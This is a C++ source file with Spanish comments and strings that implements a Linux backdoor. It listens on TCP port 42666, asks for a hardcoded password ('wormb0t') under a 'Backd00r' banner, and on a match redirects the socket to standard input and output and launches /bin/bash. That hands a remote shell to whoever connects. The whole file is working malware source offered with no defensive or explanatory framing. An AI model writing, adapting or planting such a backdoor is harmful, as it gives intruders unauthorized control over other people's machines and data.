#ifdef __linux__
    #include <iostream>
	#include <string.h>
    #include <sys/socket.h>
	#include <netinet/in.h>
	#include <unistd.h>
	#define LINUX true
    #define PUERTO 42666
    #define PASSW0RD "wormb0t"
    using namespace std;
#else
	#define LINUX false
#endif

void verificar_linux() {
	if(!LINUX) {
		perror("El sistema operativo no es una distro de Linux");
		exit(1);	
	}
	cout << "✓ Sistema Operativo Linux" << endl;
}

int establecer_puerto(int argc, char **argv) {
	int puerto;
	if (argv[1]) {
		puerto = stoi(argv[1]);
	} else {
		puerto = PUERTO;
	}
	if (argc < 2) {
		cout << "🐛 Es posible cambiar el puerto con: " << argv[0] << " <no. puerto>" << endl;
	}
	return puerto;
}

void crear_socket(int &descriptor_archivo) {	
	if ((descriptor_archivo = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("✗ Fallo de creación del socket.");
		exit(1);
	}	
}

struct sockaddr_in crear_estructura_transporte(int puerto) {
	struct sockaddr_in servidor;
	servidor.sin_family = AF_INET;
	servidor.sin_port = htons(puerto);
	servidor.sin_addr.s_addr = INADDR_ANY;
	return servidor;
}

void enlazar(int fd, struct sockaddr_in con) {
	if (bind(fd, (struct sockaddr *)&con, sizeof(con)) == -1) {
		perror("✗ Error en el enlace");
		exit(1);
	}
	cout << "✓ Enlace completado" << endl;
}	

int main(int argc, char **argv) {
	ios::sync_with_stdio(0);
	verificar_linux();
	int puerto = establecer_puerto(argc, argv);
	int descriptor_archivo;
	crear_socket(descriptor_archivo);	
	struct sockaddr_in con = crear_estructura_transporte(puerto);
	enlazar(descriptor_archivo, con);
	listen(descriptor_archivo, 1);
	cout << "⌛ Esperando una conexión..." << endl;
	while ((descriptor_archivo = accept(descriptor_archivo, 0, 0)) == -1);
	cout << "✌  Conectado" << endl;
	char const* bienvenida = "Backd00r ~ ☭ Abrx4s\n\nContraseña: ";
	char const* mensaje_exito = "😈 Contraseña correcta. Estás dentro y con acceso a la shell.\n";
	char const* mensaje_error = "Contraseña incorrecta\n";
	send(descriptor_archivo, bienvenida, strlen(bienvenida), 0);
	char buffer[1024];
	memset(buffer, 0, 1024);
	recv(descriptor_archivo, buffer, 1024, 0);
	buffer[strlen(buffer) - 1] = '\0';
	if (strcmp(PASSW0RD, buffer) == 0) {
		send(descriptor_archivo, mensaje_exito, strlen(mensaje_exito), 0);
	} else {
		send(descriptor_archivo, mensaje_error, strlen(mensaje_error), 0);
		exit(1);
	}
	dup2(descriptor_archivo, 0);
	dup2(descriptor_archivo, 1);
	dup2(descriptor_archivo, 2);
	extern char** environ;
	char* newargv[] = { NULL };
	execve("/bin/bash", newargv, environ);
	exit(0);
}
